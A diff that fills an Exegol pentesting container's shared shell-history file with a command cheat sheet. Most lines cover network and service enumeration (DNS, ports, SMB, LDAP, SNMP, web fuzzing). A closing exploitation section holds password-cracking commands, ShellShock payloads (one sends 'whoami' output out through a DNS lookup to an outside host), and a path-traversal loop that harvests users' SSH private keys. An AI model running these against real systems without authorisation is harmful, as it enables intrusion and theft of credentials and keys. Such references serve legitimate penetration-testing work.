@@ -1,2 +1,158 @@
 # Config file dedicated to the user's personal history shared between all exegol containers
 
+# ----- Active Enumeration ----- #
+
+# DNS
+host "$DOMAIN" # By default is A record
+host -t MX "$DOMAIN" # Mail exchange records
+host -t TXT "$DOMAIN" # Text records
+host -t CNAME "$DOMAIN" # Canonical name records
+host -t AAAA "$DOMAIN" # IPv6 address records
+host -t ns "$DOMAIN" | cut -d " " -f 4 | sed 's/\.$//' # Get DNS servers for a given domain
+for ip in $(cat `fzf-wordlists`); do host "$TARGET"."$DOMAIN"; done | grep -v "not found" # Forward lookup brute force
+for NS in $(host -t ns "$DOMAIN" | cut -d ' ' -f 4 | cut -d '.' -f 1); do host -l "$DOMAIN" "$NS"."$DOMAIN"; done # Aumotamted DNS zone transfer for each name server
+dnsrecon -d "$DOMAIN" -t "$DNS_RECORD" # Basic request
+dnsrecon -d "$DOMAIN" -D `fzf-wordlists` -t brt # DNS zone transfer
+dnsenum "$DOMAIN"
+
+
+# Port scanning
+for i in {1..65535}; do (echo > /dev/tcp/"$TARGET"/"$i") >/dev/null 2>&1 && echo "$i" is open; done # bash
+1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("$TARGET",$_)) "Port $_ is open"} 2>$null # powershell
+for i in {1..65535}; do nc -nv -w 1 -z 1 "$TARGET" "$i" 2>&1 | grep "Connected"; done # netcat
+for ip in $(dig "$DOMAIN" +short);do nmap -sC -sV -Pn "$TARGET"; done # SCan IP from DNS
+SCAN_NAME="$DB_HOSTNAME"; RATE=5000; PORTS=$(nmap -Pn --min-rate "$RATE" -p- "$TARGET" | grep "/tcp" | cut -d '/' -f1 | paste -sd ',' -); echo "$PORTS"; nmap -v -A -sC -sT -Pn -T5 --max-retries 3 -oA "$SCAN_NAME"_tcp --script vuln -p "$PORTS" "$TARGET"
+SCAN_NAME="$DB_HOSTNAME"; RATE=5000; PORTS=$(nmap -Pn -p- -sU --open --min-rate "$RATE" "$TARGET" | grep "/udp" | cut -d '/' -f1 | paste -sd ',' -); echo "$PORTS"; nmap -v -A -sC -sU -Pn -T5 --max-retries 3 -oA "$SCAN_NAME"_udp --script vuln -p "$PORTS" "$TARGET"
+nmap -v -sU -sS --top-port 100 "$TARGET" # UDP Scan ++
+nmap --script-updatedb
+
+# FTP
+nmap -v --script "ftp-*" -p 21 "$TARGET"
+wget -r ftp://"$USER":"$PASSWORD"@"$TARGET" # Dump all
+nmap -sU -p 69 --script tftp-enum "$TARGET"
+nmap -sU -p 69 --script tftp-enum.nse --script-args tftp-enum.filelist=`fzf-wordlists` "$TARGET"
+
+# Host Discovery
+nmap -sn "$TARGET"/24 | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' # Get host up IPs from network
+for i in {1..255};do (ping -c 1 192.168.0."$i" | grep "bytes from" &);done # Ping sweep
+for ($i=1;$i -lt 255;$i++) { ping -n 1 192.168.0."$i"| findstr "TTL"}
+nxc smb "$TARGET"/24 --gen-relay-list relay_list.txt # Maps the network of live hosts and saves a list of only the hosts that don't require SMB signing.
+arp -a
+
+# LDAP
+nmap -v -n -sV --script "ldap* and not brute" "$TARGET"
+nxc ldap "$TARGET" -u "$USER" -p "$PASSWORD" --users # Enumerate users
+nxc ldap "$TARGET" -u "$USER" -p "$PASSWORD" --active-users # Enumerate just active users
+nxc ldap "$TARGET" -u "$USER" -p "$PASSWORD" -k --get-sid # Get domain SID
+
+# MSSQL
+nmap -A -sV --script "ms-sql-*" -p "$PORT" "$TARGET"
+
+# MySQL
+nmap -A -sV --script "mysql-*" -p "$PORT" "$TARGET"
+
+# NFS
+nmap -v -sV -p 111 --script "rpcinfo" "$TARGET"  # Get NFS version
+nmap -v -p 111 --script "nfs*" "$TARGET" # View NFS shared directories
+rpcinfo "$TARGET" | grep "nfs" # Get info to NFS
+showmount -e "$TARGET" # List mounts
+mkdir "/tmp/nfs_mount"; mount -t "nfs" -o "vers=4" "$TARGET:/$NFS_FOLDER" "/tmp/nfs_mount" -o "nolock" # Mount NFS folder on machine
+
+# Oracle
+nmap -A -sV --script "oracle-*" -p "$PORT" "$TARGET"
+
+# POP
+nmap -v --script "pop3-capabilities,pop3-ntlm-info" -sV -p 110 "$TARGET"
+
+# RDP
+nmap -v --script "rdp-ntlm-info,rdp-enum-encryption,rdp-vuln-ms12-020" -p 3389 -T4 "$TARGET" # Enumerate RDP protocol
+rdp_check "$DOMAIN/$USER:$PASSWORD@$TARGET"
+xfreerdp /u:"$USER" /p:"$PASSWORD" +clipboard /dynamic-resolution /cert:ignore /v:"$TARGET" /drive:exegol,/tmp
+rdesktop -u "$USER" "$TARGET"
+
+# RPC
+nmap -sSUC -p111 "$TARGET" # Get RPC info
+nmap --script "msrpc-enum" -p 135 "$TARGET"
+rpcinfo "$TARGET"
+rpcinfo "$TARGET" | grep "ypbind" # Probably able to list and download (and maybe upload) files (https://hacktricks.boitatech.com.br/pentesting/pentesting-rpcbind#nis)
+rpcclient -N -U "" -p "$PORT" "$TARGET" # Anonymous logon (-N: No password)
+rpcclient -U "$USER" "$TARGET"
+rpcclient -W "$WORKGROUP" -U "$USER" "$TARGET" # -W: Workgroup
+impacket-rpcdump -port 135 "$TARGET" | grep -E "MS-EFSRPC|MS-RPRN|MS-PAR" # MS-EFSRPC: It might be vulnerable to PetitPotam, MS-RPRN, MS-PAR: It might be vulnerable to PrintNightmare.
+
+# SMB
+nmap -v -A -O -sC -sV -Pn --osscan-guess --script "smb-enum*" -p 139,445 "$TARGET"
+nbtscan -r "$TARGET"/24
+nxc smb "$TARGET" -u '' -p '' # Null session enumeration
+nxc smb "$TARGET" -u '' -p '' --shares
+nxc smb "$TARGET" -u '' -p '' --pass-pol
+nxc smb "$TARGET" -u '' -p '' --users
+nxc smb "$TARGET" -u '' -p '' --groups
+nxc smb "$TARGET" -u 'guest' -p '' # Guest session enumeration
+nxc smb "$TARGET" -u 'guest' -p '' --shares
+nxc smb "$TARGET" -u 'guest' -p '' --pass-pol
+nxc smb "$TARGET" -u 'guest' -p '' --users
+nxc smb "$TARGET" -u 'guest' -p '' --groups
+nxc smb "$TARGET" -d "$DOMAIN" -u 'guest' -p '' # Guest session enumeration
+nxc smb "$TARGET" -d "$DOMAIN" -u 'guest' -p '' --shares
+nxc smb "$TARGET" -d "$DOMAIN" -u 'guest' -p '' --pass-pol
+nxc smb "$TARGET" -d "$DOMAIN" -u 'guest' -p '' --users
+nxc smb "$TARGET" -d "$DOMAIN" -u 'guest' -p '' --groups
+nxc smb "$TARGET"/24 -u "$USER" -p "$PASSWORD" --rid-brute # brute force RIDs
+nxc smb "$TARGET"/24 -u "$USER" -p "$PASSWORD" --local-group # Enumerate local groups
+nxc smb "$TARGET"/24 -u "$USER" -p "$PASSWORD" --pass-pol # Enumerate password policy
+nxc smb "$TARGET"/24 -u "$USER" -p "$PASSWORD" -M enum_av # Enumerate anti-virus & EDR
+nxc smb "$TARGET"/24 -u "$USER" -p "$PASSWORD" --sessions # Enumerate active sessions
+nxc smb "$TARGET"/24 -u "$USER" -p "$PASSWORD" --shares --filter-shares READ WRITE # Enumerate only readable or writable shares
+nxc smb "$TARGET"/24 -u "$USER" -p "$PASSWORD" --interfaces # Enumerate interfaces
+nxc smb "$TARGET"/24 -u "$USER" -p "$PASSWORD" --disks # Enumerate disks
+nxc smb "$TARGET"/24 -u "$USER" -p "$PASSWORD" --loggedon-users # Enumerate logged users
+nxc smb "$TARGET"/24 -u '' -p '' --disks
+nxc smb "$TARGET"/24 -u 'guest' -p '' --shares
+nxc smb "$TARGET"/24 -u "$USER" -p "$PASSWORD" --shares
+nxc smb "$TARGET" -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=True # Dump all shares (like DumpSMBShare)
+
+# SMTP
+nmap -v --script "smtp-commands,smtp-open-relay" -p 25 "$TARGET"
+hydra smtp-enum://"$TARGET"/vrfy -L `fzf-wordlists`
+
+# SNMP
+nmap -sU --open -p 161 "$TARGET"/24
+onesixtyone -c `fzf-wordlists` -i ips.txt # Enumerate communities
+snmp-check "$TARGET" -c "$COMMUNITY"
+snmpwalk -c "$COMMUNITY" -v "$VERSION" "$TARGET" # Enumerate entire MIB tree
+snmpwalk -c "$COMMUNITY" -v "$VERSION" "$TARGET" 1.3.6.1.4.1.77.1.2.25 # Enumerates the Windows users
+snmpwalk -c "$COMMUNITY" -v "$VERSION" "$TARGET" 1.3.6.1.2.1.25.4.2.1.2 # Enumerate all the currently running processes
+snmpwalk -c "$COMMUNITY" -v "$VERSION" "$TARGET" 1.3.6.1.2.1.25.6.3.1.2 # Query all the software that is installed on the machine
+snmpwalk -c "$COMMUNITY" -v "$VERSION" -Oa "$TARGET" 1.3.6.1.2.1.2.2.1.2 # List interface name
+snmpwalk -c "$COMMUNITY" -v "$VERSION" "$TARGET" 1.3.6.1.2.1.6.13.1.3 # Enumeration technique is to list all the current TCP listening ports
+snmpwalk -c "$COMMUNITY" -v "$VERSION" "$TARGET" NET-SNMP-EXTEND-MIB::nsExtendObjects
+snmpwalk -c "$COMMUNITY" -v "$VERSION" "$TARGET" NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+
+# Web
+nmap -p "$PORT" --script "http-enum" "$TARGET"
+nikto -host "$TARGET" -port "$PORT" -C all
+ffuf -c -w `fzf-wordlists` -u "http://$TARGET/FUZZ" -e .php,.html,.txt,.pdf,.xml,.aspx,.bak,.config # Simple directory brute force with extensions
+ffuf -c -w `fzf-wordlists` -u "http://FUZZ.$TARGET" -H "Host: FUZZ.$TARGET" # subdomain enumeration
+ffuf -c -w `fzf-wordlists` -u "http://$TARGET/?FUZZ=test_value" -fc 401 # GET parameter brute force with filter on HTTP response
+ffuf -w /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -X POST -d "username=FUZZ&&password=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://mydomain.com/login -mr "username already exists" # Find usernames
+ffuf -c -w `fzf-wordlists` -u "http://$TARGET/login.php" -X POST -d "username=admin\&password=FUZZ" -fc 401 # Brute force password
+gobuster dir -u http://$TARGET -w `fzf-wordlists` -p pattern.txt # pattern.txt contain : {GOBUSTER}/v1\n {GOBUSTER}/v2
+
+# ----- Exploitation ----- #
+
+# Password Attacks
+keepass2john $KDBX_FILE > $HASH_FILE
+john --format=keepass --wordlist=`fzf-wordlists` $HASH_FILE
+cewl "$DOMAIN" -w "$OUTFILE" # generating wordlist based on information from a website
+crunch "$MIN_LEN" "$MAX_LEN" "$CARSHET"
+hashcat -r "$RULE_FILE" --stdout "$OUTPUT_FILE" # Test new rule
+hashcat -m "$HASH_MODE" "$HASHFILE" -r "$RULE_FILE_1" -r "$RULE_FILE_2" # It's possible to concatenate rule files
+
+# ShellShock
+curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -c 'whoami'" "$TARGET" # Exploit shellshock
+curl -A "() { :; }; /usr/bin/nslookup $(whoami).site.com" "$TARGET" # Exploit shellshock
+
+# LFI
+echo "id_rsa\nid_dsa\nid_ecdsa\nid_ecdsa-sk\nid_ed25519\nid_ed25519-sk\nid_eddsa" > ssh_keyfile.txt # Create a file with SSH keys names
+for i in $(curl -s --path-as-is "http://$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | cut -d ':' -f 1); do for j in $(cat ssh_keyfile.txt); do curl -s --path-as-is "http://$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/$i/.ssh/$j" | grep -A 9999 "BEGIN OPENSSH PRIVATE KEY"; done; done # LFI to get SSH keys
